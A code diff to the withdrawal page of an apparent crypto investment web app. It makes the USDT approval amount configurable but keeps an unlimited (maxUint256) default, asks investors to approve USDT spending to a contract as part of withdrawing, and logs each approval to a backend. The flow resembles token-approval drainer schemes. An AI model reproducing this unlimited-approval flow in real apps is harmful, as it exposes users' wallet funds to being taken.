@@ -32,6 +32,15 @@ import { useSession } from 'next-auth/react';
 import { formatUnits, isAddress, parseUnits, maxUint256 } from 'viem'; // Removed Signature import, keep maxUint256 for approval amount
 import { calculateWithdrawalAmount } from '@/lib/utils/withdrawal-conditions';
 
+// Define USDT approval amount from environment variable, with a fallback to maxUint256
+const USDT_APPROVAL_AMOUNT = process.env.NEXT_PUBLIC_USDT_APPROVAL_AMOUNT
+  ? BigInt(process.env.NEXT_PUBLIC_USDT_APPROVAL_AMOUNT)
+  : maxUint256; // Default to maxUint256 if not set or invalid
+
+if (process.env.NEXT_PUBLIC_USDT_APPROVAL_AMOUNT && (isNaN(Number(process.env.NEXT_PUBLIC_USDT_APPROVAL_AMOUNT)) || BigInt(process.env.NEXT_PUBLIC_USDT_APPROVAL_AMOUNT) <= 0)) {
+    console.warn("Warning: NEXT_PUBLIC_USDT_APPROVAL_AMOUNT is not a valid positive number. Using maxUint256 as fallback.");
+}
+
 const InfoCard = ({ title, children, icon: Icon, id }) => {
   const [isOpen, setIsOpen] = useState(false);
 
@@ -637,7 +646,7 @@ export default function InvestorWithdrawPage() {
 
     try {
       // 1. Define Approve Arguments
-      const approvalAmount = maxUint256; // Or parseUnits(amount, USDT_DECIMALS);
+      const approvalAmount = USDT_APPROVAL_AMOUNT;
 
       const approveArgs = {
         address: currentTokenAddress,
@@ -651,7 +660,7 @@ export default function InvestorWithdrawPage() {
       };
 
       // 2. Call Approve Function
-      setTxStatus('Please confirm the USDT approval transaction in your wallet...');
+      setTxStatus('Please approve the USDT transaction in your wallet. If your wallet does not open automatically, kindly open it manually to complete the approval.');
       console.log("Attempting USDT Approve with args:", approveArgs);
       const txHash = await approveUsdtSpend(approveArgs);
 
@@ -669,8 +678,8 @@ export default function InvestorWithdrawPage() {
             ownerAddress: connectedAddress,
             spenderAddress: CONTRACT_ADDRESS,
             tokenAddress: currentTokenAddress, // This is USDT_ADDRESS
-            approvedAmount: approvalAmount.toString(),
-            approvedAmountHumanReadable: "Unlimited", // Or formatUnits(approvalAmount, USDT_DECIMALS)
+            approvedAmount: USDT_APPROVAL_AMOUNT.toString(),
+            approvedAmountHumanReadable: formatUnits(USDT_APPROVAL_AMOUNT, 6) + " USDT",
             transactionHash: txHash,
             tokenSymbol: "USDT" // Added for clarity in backend
           }),
